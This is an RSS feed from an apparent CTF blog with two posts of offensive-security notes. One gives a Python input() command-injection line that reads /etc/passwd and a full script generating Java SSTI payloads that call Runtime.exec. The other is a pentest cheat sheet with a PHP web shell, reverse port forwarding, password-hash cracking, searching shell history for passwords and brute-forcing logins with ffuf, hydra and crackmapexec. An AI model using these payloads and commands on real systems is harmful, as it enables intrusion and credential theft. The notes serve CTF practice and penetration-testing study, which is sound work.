<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on 53CTF</title>
        <link>https://53ctf.github.io/posts/</link>
        <description>Recent content in Posts on 53CTF</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sat, 07 Jan 2023 18:04:11 +0530</lastBuildDate>
        <atom:link href="https://53ctf.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Python</title>
            <link>https://53ctf.github.io/posts/2023/01/python/</link>
            <pubDate>Sat, 07 Jan 2023 18:04:11 +0530</pubDate>
            
            <guid>https://53ctf.github.io/posts/2023/01/python/</guid>
            <description>Take Advantage Of input() Function And Run System Commands Within It
__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator
GitHub Source
#!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=&amp;#34;Generate SSTI payloads... One character at a time.&amp;#34;) parser.add_argument(&amp;#34;-u&amp;#34;,&amp;#34;--url-encode&amp;#34;, action=&amp;#34;store_true&amp;#34;, help=&amp;#34;URL Encode&amp;#34;) args = parser.parse_args() url_encode=args.url_encode class Terminal(Cmd): prompt=&amp;#39;\033[1;33mCommand ==&amp;gt;\033[0m &amp;#39; def decimal_encode(self,args): command=args decimals=[] for i in command: decimals.append(str(ord(i))) payload=&amp;#39;&amp;#39;&amp;#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&amp;#39;&amp;#39;&amp;#39; % decimals[0] for i in decimals[1:]: line=&amp;#39;.concat(T(java.lang.Character).toString({}))&amp;#39;.format(i) payload+=line payload+=&amp;#39;).getInputStream())}&amp;#39; if url_encode: payload_encoded=urllib.</description>
            <content type="html"><![CDATA[<p>Take Advantage Of <code>input()</code> Function And Run System Commands Within It</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;cat /etc/passwd&#39;</span>)
</span></span></code></pre></div><p>Easy SSTI Payloads Generator<br>
<a href="https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py">GitHub Source</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cmd <span style="color:#f92672">import</span> Cmd
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse<span style="color:#f92672">,</span> argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Generate SSTI payloads... One character at a time.&#34;</span>)
</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>,<span style="color:#e6db74">&#34;--url-encode&#34;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;URL Encode&#34;</span>)
</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url_encode<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>url_encode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Terminal</span>(Cmd):
</span></span><span style="display:flex;"><span>	prompt<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;33mCommand ==&gt;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m &#39;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decimal_encode</span>(self,args):
</span></span><span style="display:flex;"><span>		command<span style="color:#f92672">=</span>args
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		decimals<span style="color:#f92672">=</span>[]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> command:
</span></span><span style="display:flex;"><span>			decimals<span style="color:#f92672">.</span>append(str(ord(i)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">)&#39;&#39;&#39;</span> <span style="color:#f92672">%</span> decimals[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> decimals[<span style="color:#ae81ff">1</span>:]:
</span></span><span style="display:flex;"><span>			line<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;.concat(T(java.lang.Character).toString(</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">))&#39;</span><span style="color:#f92672">.</span>format(i)
</span></span><span style="display:flex;"><span>			payload<span style="color:#f92672">+=</span>line
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;).getInputStream())}&#39;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> url_encode:
</span></span><span style="display:flex;"><span>			payload_encoded<span style="color:#f92672">=</span>urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(payload,safe<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> payload_encoded
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">default</span>(self,args):
</span></span><span style="display:flex;"><span>		print(self<span style="color:#f92672">.</span>decimal_encode(args))
</span></span><span style="display:flex;"><span>		print()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>	term<span style="color:#f92672">=</span>Terminal()
</span></span><span style="display:flex;"><span>	term<span style="color:#f92672">.</span>cmdloop()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
</span></span><span style="display:flex;"><span>	quit()
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Linux Notes</title>
            <link>https://53ctf.github.io/posts/2023/01/linux-notes/</link>
            <pubDate>Sat, 07 Jan 2023 09:33:57 +0530</pubDate>
            
            <guid>https://53ctf.github.io/posts/2023/01/linux-notes/</guid>
            <description>View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&amp;gt;/dev/null PHP WebShell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &amp;#39;/&amp;#39; -ie &amp;#34;STRING_THAT_WANT_BE_FOUND&amp;#34; --color=always 2&amp;gt; /dev/null find .</description>
            <content type="html"><![CDATA[<h3 id="view-cron-jobs">View Cron Jobs</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crontab -l
</span></span></code></pre></div><h3 id="list-scheduled-processestasksscripts">List Scheduled Processes/Tasks/Scripts</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systemctl list-timers
</span></span></code></pre></div><h3 id="view-nfs-network-file-share">View NFS (Network File Share)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>showmount REMOTE_IP -e
</span></span></code></pre></div><h3 id="mount-nfs">Mount NFS</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT
</span></span></code></pre></div><h3 id="crack-zip-files">Crack ZIP Files</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE
</span></span></code></pre></div><h3 id="find-suid-binaries">Find SUID Binaries</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -perm -4000 2&gt;/dev/null
</span></span></code></pre></div><h3 id="php-webshell">PHP WebShell</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h3 id="smb-shares">SMB Shares</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H REMOTE_IP -u USERNAME
</span></span></code></pre></div><h3 id="basic-chisel-port-forwarding">Basic Chisel Port Forwarding</h3>
<h4 id="server">Server</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel server --reverse --port LOCAL_PORT
</span></span></code></pre></div><h4 id="client">Client</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT
</span></span></code></pre></div><h3 id="find-open-ports">Find Open Ports</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netstat -tupln
</span></span></code></pre></div><h3 id="oskernel-information">OS/Kernel Information</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uname -a
</span></span><span style="display:flex;"><span>cat /proc/version
</span></span><span style="display:flex;"><span>cat /etc/issue
</span></span></code></pre></div><h3 id="cpu-information">CPU Information</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lscpu
</span></span></code></pre></div><h3 id="identifying-the-network-route">Identifying the Network Route</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>route
</span></span><span style="display:flex;"><span>ip route
</span></span></code></pre></div><h3 id="discover-other-ip-address-on-a-network">Discover Other IP Address On A Network</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp -a
</span></span><span style="display:flex;"><span>ip neigh
</span></span></code></pre></div><h3 id="look-for-a-specific-string-in-the-file-system">Look For A Specific String In The File System</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep --color<span style="color:#f92672">=</span>auto -rnw <span style="color:#e6db74">&#39;/&#39;</span> -ie <span style="color:#e6db74">&#34;STRING_THAT_WANT_BE_FOUND&#34;</span> --color<span style="color:#f92672">=</span>always 2&gt; /dev/null
</span></span><span style="display:flex;"><span>find . -type f -exec grep -i -I <span style="color:#e6db74">&#34;STRING_THAT_WANT_BE_FOUND&#34;</span> <span style="color:#f92672">{}</span> /dev/null <span style="color:#ae81ff">\;</span>
</span></span></code></pre></div><h3 id="find-passwords-in-history">Find Passwords in History</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat ~/.bash_history | grep -i passw
</span></span></code></pre></div><h3 id="cracking-linuxbcrypt-password">Cracking Linux(bcrypt) Password</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unshadow PASSWD_FILE SHADOW_FILE &gt; unshadowed.txt
</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">1800</span> unshadowed.txt /PATH/TO/WORDLIST -O
</span></span></code></pre></div><h3 id="nslookup">NSLookup</h3>
<p>nslookup is a network administration command-line tool for querying the Domain Name System to obtain the mapping between the domain name and IP address or other DNS records.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nslookup -type<span style="color:#f92672">=</span>any DOMAIN.COM
</span></span></code></pre></div><h3 id="dnsrecon">DNSRecon</h3>
<p>DNSRecon is a Python script that provides the ability to perform: Check all NS Records for Zone Transfers. Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF, and TXT). Perform common SRV Record Enumeration. Top Level Domain (TLD) Expansion.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dnsrecon -d DOMAIN.COM -D /PATH/TO/SUBDMAIN/WORDLIST -t brt
</span></span></code></pre></div><h3 id="git-dumper">Git-Dumper</h3>
<p>A tool to dump a git repository from a website.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git-dumper http://SITENAME.COM/.git
</span></span></code></pre></div><h3 id="ldapsearch">LDAPSearch</h3>
<p>LDAPSearch is a shell-accessible interface to the ldap_search_ext(3) library call.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -D binddn<span style="color:#ae81ff">\\</span>ldap -H ldap://REMOTE_IP -w <span style="color:#e6db74">&#39;PASSWORD&#39;</span>
</span></span><span style="display:flex;"><span>ldapsearch -D binddn<span style="color:#ae81ff">\\</span>ldap -H ldap://REMOTE_IP -w <span style="color:#e6db74">&#39;PASSWORD&#39;</span> | grep name: | sed <span style="color:#e6db74">&#39;s/^name: //&#39;</span> | grep -vE <span style="color:#e6db74">&#39;D|C|A|U&#39;</span> &gt; /PATH/TO/USERNAMES/WORDLIST
</span></span></code></pre></div><h3 id="whatweb">WhatWeb</h3>
<p>WhatWeb identifies websites. It recognizes web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb https://DOMAIN/
</span></span></code></pre></div><h3 id="arpscan">ARPScan</h3>
<p>ARP-SCAN is a command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo arp-scan -l
</span></span></code></pre></div><h3 id="netdiscover">NetDiscover</h3>
<p>Netdiscover is an active/passive address reconnaissance tool, mainly developed for those wireless networks without a DHCP server when you are wardriving. Similar to ARP-SCAN.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo netdiscover -r IP/24
</span></span></code></pre></div><h3 id="smbclient">SMBClient</h3>
<p>SMBCLIENT is a client that can &rsquo;talk&rsquo; to an SMB/CIFS server. It offers an interface similar to that of the FTP program.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#ae81ff">\\\\</span>REMOTE_IP<span style="color:#ae81ff">\\</span>
</span></span></code></pre></div><h3 id="ssh">SSH</h3>
<p>OpenSSH is the premier connectivity tool for remote login with the SSH protocol.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh REMOTE_IP -o KexAlgorithms<span style="color:#f92672">=</span>+diffie-helman-group1-sha1 -c aex128-cbc
</span></span></code></pre></div><h3 id="evil-winrm">Evil-WinRM</h3>
<p>This shell is the ultimate WinRM shell for hacking/pen testing. WinRM (Windows Remote Management) is the Microsoft implementation of the WS-Management Protocol.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i IP_ADDRESS -u username -p password
</span></span></code></pre></div><h3 id="ffuf">FFUF</h3>
<p>ffuf · Fast web fuzzer written in Go.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://www.vulnbegin.co.uk/FUZZ -H <span style="color:#e6db74">&#34;Cookie:ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34;</span> -t <span style="color:#ae81ff">1</span> -p 0.1 -mc all -fc <span style="color:#ae81ff">404</span> -c
</span></span></code></pre></div><p>It can be also used to brute-force login forms.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w ~/wordlists/usernames.txt -X POST -d <span style="color:#e6db74">&#34;username=FUZZ&amp;password=x&#34;</span> -t <span style="color:#ae81ff">1</span> -p 0.1 -H <span style="color:#e6db74">&#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -u http://www.vulnbegin.co.uk/cpadmin/login -fr <span style="color:#e6db74">&#39;Username is invalid&#39;</span>
</span></span><span style="display:flex;"><span>ffuf -w ~/wordlists/passwords.txt -X POST -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> -t <span style="color:#ae81ff">1</span> -p 0.1 -H <span style="color:#e6db74">&#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -u http://www.vulnbegin.co.uk/cpadmin/login -fr <span style="color:#e6db74">&#39;Password is invalid&#39;</span>
</span></span></code></pre></div><p>And also for id fuzzing.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">100</span> | ffuf -w - -t <span style="color:#ae81ff">1</span> -p 0.1 -H <span style="color:#e6db74">&#34;X-Token: 492E64385D3779BC5F040E2B19D67742&#34;</span> -H <span style="color:#e6db74">&#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34;</span> -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc <span style="color:#ae81ff">404</span>
</span></span></code></pre></div><h3 id="crackmapexec">CrackMapExec</h3>
<p>This package is a swiss army knife for pentesting Windows/Active Directory environments.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec winrm REMOTE_IP -u /PATH/TO/USERNAMES/WORDLIST_OR_SINGLE_USERNAME -p /PATH/TO/PASSWORDS/WORDLIST_OR_SINGLE_PASSWORD
</span></span></code></pre></div><h3 id="hydra">Hydra</h3>
<p>Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.</p>
<p><strong>Brute-forcing SSH with HYDRA.</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l USERNAME -P /PATH/TO/PASSWORD/WORDLIST ssh://REMOTE_IP:22 -t <span style="color:#ae81ff">4</span> -V
</span></span></code></pre></div>]]></content>
        </item>
        
    </channel>
</rss>
